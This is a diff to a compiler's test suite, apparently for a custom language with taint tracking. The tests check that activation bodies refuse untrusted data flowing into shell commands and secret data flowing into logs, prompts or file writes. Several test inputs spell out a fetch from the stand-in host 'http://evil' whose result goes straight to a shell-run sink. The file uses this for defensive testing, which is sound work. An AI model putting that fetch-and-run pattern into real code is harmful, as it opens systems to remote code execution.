@@ -45,6 +45,14 @@ _PRELUDE = (
     "extern emission[log] fn logit(m: Str) -> Int = @py { return 0 }\n"
     "extern emission[fs.write] fn to_json(m: Str) -> Int = @py { return 0 }\n"
     "extern emission[model.complete] fn prompt(p: Str) -> Str = @py { return p }\n"
+    # Non-emission sources of the same two taints. An activation body has no
+    # value binding, and one `emit` marks one crossing (issue #1427), so an
+    # emission's result cannot be handed to another emission there at all:
+    # `emit run(fetch(..))` is refused at the marker before taint runs. These
+    # carry the taint into an activation-body sink without a second crossing,
+    # which is what the activation-body flow analysis is tested against.
+    "extern pure fn page(u: Str) -> Untrusted[Str] = @py { return u }\n"
+    "extern pure fn card(a: Str) -> Secret[Str] = @py { return a }\n"
 )
 
 
@@ -84,10 +92,19 @@ def test_activation_body_untrusted_into_a_shell_sink_is_refused():
     directly in an activation body compiled clean and the shell command ran. The
     byte-identical flow inside a `provide` method was already refused with G9 —
     the inferred signature was correct, the `emit` site simply never reached
-    `_check_sinks`."""
-    err = _refuses(_activation('  emit run(fetch("http://evil"))'), "G9")
+    `_check_sinks`. The untrusted value comes from a non-emission source here;
+    the exploit's own spelling is pinned below."""
+    err = _refuses(_activation('  emit run(page("http://evil"))'), "G9")
     assert "shell command" in err.message
     assert "`run`" in err.message
+
+
+def test_the_exploit_spelling_is_refused_at_the_marker():
+    """`emit run(fetch(..))` nests a second crossing under one marker, so since
+    issue #1427 it is refused for that before the flow analysis sees it. Either
+    refusal closes the exploit; this pins which one wins."""
+    err = _refuses(_activation('  emit run(fetch("http://evil"))'), "G4")
+    assert "call to emission `fetch` must be marked `emit`" in err.message
 
 
 def test_the_same_flow_in_a_provide_method_was_and_stays_refused():
@@ -97,7 +114,7 @@ def test_the_same_flow_in_a_provide_method_was_and_stays_refused():
         _PRELUDE
         + "service Ops { emission fn go(u: Str) -> Int }\n"
         + "component Agent provides ops: Ops {\n  provide ops {\n"
-        + "    fn go(u) {\n      emit run(fetch(\"http://evil\"))\n"
+        + "    fn go(u) {\n      emit run(page(\"http://evil\"))\n"
         + "      return 0\n    }\n  }\n}\n")
     assert _code_of(src) == "G9"
 
@@ -105,17 +122,17 @@ def test_the_same_flow_in_a_provide_method_was_and_stays_refused():
 def test_activation_body_secret_into_a_log_is_refused():
     """A `Secret[T]` value reaching a log from an activation body is a disclosure
     sink exactly as it is from a provide method (§7b)."""
-    err = _refuses(_activation('  emit logit(charge("card"))'), "G-SECRET-FLOW")
+    err = _refuses(_activation('  emit logit(card("card"))'), "G-SECRET-FLOW")
     assert "disclosure sink" in err.message
 
 
 def test_activation_body_secret_into_a_model_prompt_is_refused():
     """A `model.*` emission argument is an LLM prompt — a disclosure sink."""
-    _refuses(_activation('  emit prompt(charge("card"))'), "G-SECRET-FLOW")
+    _refuses(_activation('  emit prompt(card("card"))'), "G-SECRET-FLOW")
 
 
 def test_activation_body_secret_into_fs_write_is_refused():
-    _refuses(_activation('  emit to_json(charge("card"))'), "G-SECRET-FLOW")
+    _refuses(_activation('  emit to_json(card("card"))'), "G-SECRET-FLOW")
 
 
 def test_activation_body_untrusted_reaches_a_sink_through_a_helper_fn():
@@ -123,7 +140,7 @@ def test_activation_body_untrusted_reaches_a_sink_through_a_helper_fn():
     signature is applied at an activation-body call site, not only inside a
     provide method."""
     src = _activation(
-        '  emit wash(fetch("http://evil"))',
+        '  emit wash(page("http://evil"))',
         extra="fn wash(c: Str) -> Int { return run(c) }\n")
     assert _code_of(src) == "G9"
 
@@ -154,7 +171,7 @@ def test_an_activation_body_secret_reaching_a_declared_receiver_compiles():
         + "service Keep { emission fn hold(y: Secret[Str]) -> Int }\n"
         + "service Ops { emission fn go(u: Str) -> Int }\n"
         + "component Agent requires k: Keep provides ops: Ops {\n"
-        + '  emit k.hold(charge("card"))\n'
+        + '  emit k.hold(card("card"))\n'
         + "  provide ops {\n    fn go(u) {\n      return 0\n    }\n  }\n}\n")
     assert _code_of(src) is None
 
@@ -169,7 +186,7 @@ def test_an_activation_body_flow_is_reported_once():
         + "service Ops { emission fn go(u: Str) -> Int }\n"
         + "component Agent provides ops: Ops {\n"
         + "  let store = effect Map.new() undo store.drop()\n"
-        + '  emit run(fetch("http://evil"))\n'
+        + '  emit run(page("http://evil"))\n'
         + "  provide ops {\n    fn go(u) {\n      return 0\n    }\n  }\n}\n")
     with pytest.raises(RevlError) as excinfo:
         compile_source(src, "act.rvl")
